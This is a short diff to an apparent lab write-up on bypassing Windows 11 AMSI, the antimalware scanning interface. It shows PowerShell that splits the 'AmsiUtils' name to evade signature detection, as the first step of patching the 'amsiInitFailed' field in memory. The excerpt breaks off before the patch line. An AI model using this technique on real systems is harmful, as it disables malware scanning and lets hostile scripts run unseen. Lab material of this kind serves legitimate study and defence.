@@ -5,7 +5,7 @@ This lab demonstrates how to bypass Windows 11 AMSI (Antimalware Scan Interface)
 ## 🛠️ Step 1: AMSI Bypass (PowerShell)
 To evade detection, the `AmsiUtils` string was fragmented. This allows the script to patch the `amsiInitFailed` field in memory.
 
-```powershell
+powershell
 $part1 = "Am"; $part2 = "si"; $part3 = "Utils"
 $secretName = "$part1$part2$part3"
 $type = [Ref].Assembly.GetType("System.Management.Automation.$secretName")
